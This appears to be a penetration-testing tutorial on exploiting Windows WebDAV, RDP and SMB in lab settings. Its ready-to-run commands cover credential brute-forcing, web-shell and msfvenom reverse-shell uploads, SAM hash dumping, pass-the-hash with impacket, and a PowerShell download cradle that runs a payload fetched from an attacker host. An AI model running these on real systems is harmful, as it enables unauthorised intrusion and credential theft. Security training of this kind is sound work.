# Exploiting Vulnerabilities in Windows

## IIS WebDav

WebDAV is an http extension which turns a web server into a file server so clients can interact with files on the web server - they can move, copy, edit and delete files on the webserver using webdav. This service works with iis and runs on the same ports as it. This service tends to serve files rather than web apps.

### Enumeration

If we find webdav running on a machine, it will generally be running with iis or apache on port 80 or 443 We can use an nmap script to have a look at it more:

```bash
sudo nmap -Pn -n -sV -p80 --script=http-enum 10.10.8.18
```

### Credentials

We will need valid credentials most of the time to access webdav which is usually found at `/webdav/` We can try brute forcing them if we cannot find them anywhere else:

```bash
sudo hydra -L /usr/share/wordlists/metasploit/common_users.txt -P rockyou.txt http-get://10.10.8.18/webdav
```

### Davtest

Once we have valid credentials, we can use davtest to see which file extensions can be uploaded and executed:
```bash
sudo davtest -auth messi:Password123 -url http://10.10.8.18/webdav
```

### Cadaver

Once we have found out which file extensions can be executed, we can use cadaver to put a malicious web shell onto webdav and then trigger it via a browser:

```bash
sudo cadaver http://10.10.8.18/webdav
```

We then enter our creds.

```bash
put /usr/share/webshells/asp/webshell.asp
```

We can trigger this webshell from a browser. This webshell can be used to issue commands to the server such as typing out the contents of interesting files.

Another useful attack (if we can put .asp files onto the server) is to create a malicious reverse shell using msfvenom and then use the compromised webdav service to put it onto the server:

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.24.2 lport=4444 -f asp > shell.asp
```

We then use our cadaver session: `put shell.asp`

We can now start a handler in msfconsole and trigger the malicious .asp reverse shell by visiting it in a web-browser: `http://10.2.22.238/webdav/shell.asp`

We can use our cadaver session to delete any artifacts once we have finished with them. We can use: `delete shell.asp`

We can also use cadaver to get interesting files from webdav: `get confidential.txt`

### Msfconsole

There is a module in msfconsole which automates the exploitation of webdav (assuming we have valid credentials for it and can upload and execute .asp files):

```bash
use exploit/windows/iis/iis_webdav_upload_asp
```

We need to set the `HttpUsername`, `HttpPassword`, `RHOSTS` and `PATH` options. The path will be in the format of: `set PATH /webdav/shell.asp`

## RDP

This runs on port 3389 and lets people remotely interact with machines via a gui - it is disabled by default but can be enabled - valid credentials will be needed to access it.

### Enumeration

RDP is a gui which allows users to remotely access a windows machine. It runs by default on port 3389 but this is often changed by administrators so we need to check all ports and if we get odd results with services not recognised by nmap it is worth using the msfconsole `rdp_scanner` module to see if rdp is running over that specific port: `use auxiliary/scanner/rdp/rdp_scanner` - we will need to set the `rhosts` and `rport`

### Credentials

Once we have found rdp running, we can attempt to brute force valid credentials using hydra.

>[!WARNING]
>Slow the attack down using `-t 4` as the default `-t 16` is liable to crash the remote machine

```bash
sudo hydra -L users.txt -P rockyou.txt rdp://10.2.2.8:3333 -t 4
```

### Exploitation

Once we have valid credentials, we can use a tool such as `xfreerdp` to attempt to rdp into the victim machine:

```bash
xfreerdp /u:administrator /p:"tinkerbell" /v:10.2.2.8:3333
```

## SMB

SMB runs on port 445 though it can be found running over netbios on port 139. It is used to share devices on a local area network. It is usually set up with authentication but it can be run without this which would lead to a null session attack.

### Nmap Enumeration

If we find valid credentials for smb, we can enumerate the host's netbios information using:

```bash
nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args smbuser=administrator,smbpass=password
```

### Null Sessions

We can use `smbmap` to check for null session attacks: `sudo smbmap -H 10.2.2.8` We can then enumerate the shares if our null session attack works: `sudo smbmap -H 10.2.2.8 -R secret` the -R flag recursively lists files and directories in the specified share. We can download resources using: `sudo smbmap -H 10.2.2.8 --download "secrets\passes.txt"`

We can also use `smbclient` to try to list shares using a null session attack: `smbclient -N -L \\\\10.10.10.27\\` If we can list shares using a null session attack, we can then try to access them: `smbclient -N \\\\10.10.10.27\\backups` If we can access a share, we can enumerate it using normal commands and attempt to download interesting files using: `get prod.dtsConfig`

We can attempt to enumerate usernames using `rpcclient` if null sessions are allowed: `sudo rpcclient -U'%' 10.2.2.8` (tries to connect to the smb share using a null session via rpcclient). `enumdomusers` tries to find usernames once we have connected.

### Credentials

We will need valid credentials most of the time to access smb. A password spraying attack is best as smb can lock. We can use hydra:

```bash
sudo hydra -L users.txt -p "tinkerbell" smb://10.2.2.8:445
```

We can use patator:

```bash
sudo patator smb_login host=10.2.2.8 port=445 password=FILE0 user=FILE1 0=rockyou.txt 1=users.txt -x ignore:fgrep="STATUS_LOGON_FAILURE"
```

Or we can use crackmapexec:

```bash
sudo crackmapexec smb demo.ine.local -u users.txt -p "tinkerbell"
```

If the victim machine is not joined to a domain, we can use the `--local-auth` switch for `crackmapexec`.

If we have nothing else to go on, we can try brute forcing credentials. It might be best to limit our attacks to the built-in administrator account or other usernames which we have enumerated. If we brute force smb with hydra, it is best to limit the threads to 4 with the -t flag:

```bash
sudo hydra -L users.txt -P rockyou.txt smb://10.2.2.8:445 -t 4
```

If we use patator, we can slow down the attack using the `--rate-limit=n` option where n is the amount of seconds to wait between attempts:
```bash
sudo patator smb_login host=10.2.2.8 port=445 user=FILE0 password=FILE1 0=users.txt 1=rockyou.txt -x ignore:fgrep="STATUS_LOGON_FAILURE" --rate-limit=3
```

We can also use crackmapexec:

```bash
sudo crackmapexec smb demo.elsfoo.local -u users.txt -p rockyou.txt
```

Again, we can use the `--local-auth` switch if the victim machine is not part of a domain.

### Further Enumeration

Once we have valid credentials, we can try to connect again using them: `sudo smbmap -H 10.2.2.8 -u messi -p "Soccer321"` We will be able to see shares available for the specified user and whether they are read, write or both.

We can then use the `-r` flag to see what is inside specific shares and directories: `sudo smbmap -H 10.2.2.8 -u messi -p "Soccer321" -r kane/Documents`

The next one uses the recursive `-R` flag: `sudo smbmap -H 10.2.2.8 -u messi -p "Soccer321" -R kane`

We can try to download resources: `sudo smbmap -H 10.2.2.8 -u messi -p "Soccer321" --download kane/Documents/secret.txt` We can also specify a domain with `smbmap` by using the `-d` flag: `sudo smbmap -H 10.2.2.8 -u messi -p "Soccer321" -d FOOTBALL`

We can try to list smb shares using `smbclient` along with valid credentials: `smbclient -L \\\\10.130.40.70\\ -U administrator` We can then try to connect to a specific share: `smbclient \\\\10.130.40.70\\confidential -U administrator`

With valid credentials, we can use `rpcclient` to enumerate more: `sudo rpcclient -U'FOOTBALL\messi' 10.2.2.8` This connects to the specified machine - we can them look for users on it using `enumdomusers`

We can gather lots of useful information using `enum4linux`:

```bash
enum4linux 192.168.99.162
enum4linux -a 192.168.99.162
enum4linux -u admin -p Password123 -a 192.168.99.162
enum4linux -u admin -p Password123 -a -s /home/messi/shares.txt 192.168.99.162
```

(the -s flag brute forces share names).

If we are on a windows system, we can enumerate the smb shares using: `net view 172.30.111.10`

We can map a share to a drive on our local windows machine using: `net use K: \172.30.111.10\FooComShare` 

>[!NOTE]
>If we are in a shell from meterpreter from a Linux machine, we will need to escape the first `\` like so: `net use K: \\172.30.111.10\FooComShare`

We can now mount that drive with `K:` and interact with it as normal using commands such as `dir` and `type ConfidentialStuff.txt`

Some more useful commands are:
`dir k:\Documents`

This next one returns a number for how many files are in the specified share:
`dir k:\Documents /a-d /s /b | find /c ":\"`

This one lets us search for a specified string in the specified share:
`dir k:\Documents\*flag* /s /b`

This one searches in files in the specified share for the specified string:
`findstr /s /i monkey k:\Documents\*.*`

### Crackmapexec

Once we have found a set of valid credentials for smb, we can check a specified subnet to see if the user is a local admin on any other machines using the same password:

```bash
sudo crackmapexec smb 10.2.2.0/24 -u messi -d FOOTBALL.local -p "Password123"
```

We can use `crackmapexec` to execute system commands on a compromised machine:

```bash
sudo crackmapexec smb 10.2.2.8 -u messi -p "Password123" -x "whoami" --exec-method smbexec
```

We can also check for other logged on users for machines which we have compromised local admin credentials:

```bash
sudo crackmapexec smb 10.2.2.0/24 -u messi -d FOOTBALL.local -p "Password123" --loggedon-users
```

We can dump the contents of the `sam` database if we pass `crackmapexec` valid credentials for a local admin on the specified machine:

```bash
sudo crackmapexec smb 10.2.2.8 -u messi -d FOOTBALL.local -p "Password123" --sam
```

Hashes for Windows are useful as we can use them in *pass-the-hash* attacks. We can also use a looted hash (the nt part which is the second part of a hash on windows) with `crackmapexec` to check if the user is a local admin on other machines using the same password:

```bash
sudo crackmapexec smb 10.2.2.0/24 -u "Harry Kane" -H dsfdds8fdsart7aag98df7 --local-auth
```

### Impacket Tools

The *impacket* suite of tools allow us to attempt to get reverse shells on victim machines via compromised smb credentials and / or looted ntlm hashes:

```bash
sudo python3 psexec.py kungfu.local/jchan:Monkey888@10.0.2.15
sudo python3 smbexec.py kungfu.local/jchan:Monkey888@10.0.2.15
sudo python3 wmiexec.py kungfu.local/jchan:Monkey888@10.0.2.15
sudo python3 psexec.py "Jackie Chan":@192.168.56.101 -hashes dfd878dsfasd8f9:979dfsd97f9d7f
sudo python3 wmiexec.py bcaseiro:@172.16.5.30 -hashes dfd878dsfasd8f9:979dfsd97f9d7f
```

>[!NOTE]
>We are using the full NTLM hash in the above commands where we are using the `-hashes` flag

Out of the above commands, I find the *wmiexec.py* is better as it does not touch the filesystem and is therefore less likely to be detected by IDS:

```bash
sudo python3 wmiexec.py wwonka:Password123@10.10.30.6
```

Once we have a half-shell via this method, we can try to obtain a full shell in different ways. One way is to craft a reverse-shell (msfvenom) and then put it onto the victim machine and then execute it: `lput /home/users/attacker/game.exe .` This puts the malicious executable onto the remote machine in the same directory as we are in. This command is then run in the wmiexec half-shell to execute the reverse shell. Of course, we will need to start a reverse handler in msfconsole with the appropriate lhost and lports set before we trigger this code.

Running an executable as above might be prevented by anti-virus software. Another way to attempt to gain a full shell is by using msfconsole's *web_delivery module*. We can either run the default command it instructs to when it is run, or we can use a powershell download cradle to download the malicious link being served by the web delivery module: `use exploit/multi/script/web_delivery` We will need to set the payload using: `set payload windows/x64/meterpreter/reverse_tcp` making sure the architecture is the same as the victim machine's architecture - in this case it is x64.

Set the `LHOST` and `LPORT` options before running the module. We can also specify a URI path if we do not want the random one which the exploit will create if we do not set one: `set URIPATH /game`

We can then directly copy and paste the command directed by the web_delivery module, which will include the payload encoded using base64, or we can use the following command in the wmiexec half-shell to trigger the exploit being served:

```bash
cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.10.11.6:8080/game'))
```

The web_delivery module obviously has to be serving the malware before this command is executed in the wmiexec half-shell. We need to specify the same port as the web_delivery module is using to serve the malicious shell - it might not be 8080.

### Msfconsole

There is an `msfconsole` module which attempts to bruteforce a log in for SMB if anonymous login does not work or does not show us information.

We can use it by specifying this command: `use auxiliary/scanner/smb/smb_login` We need to set a passfile and userfile as well as the rhosts.

`/opt/SecLists/Usernames/top-usernames-shortlist.txt` and `/opt/SecLists/Passwords/Common-Credentials/best15.txt` are good start points. We can then run the module using: `run`

Once we have valid credentials, we can use them to open a meterpreter reverse shell with the commands below. We need to set rhosts, lhost and lport as usual:

```bash
use exploit/windows/smb/psexec
set SMBPASS password
set SMBUSER administrator
run
```

## Conclusion

There are lots of vulnerabilities in native Windows services as we have seen above. It is worth remembering this and checking for them when we are testing a Windows system.

---

> the enemy knows the system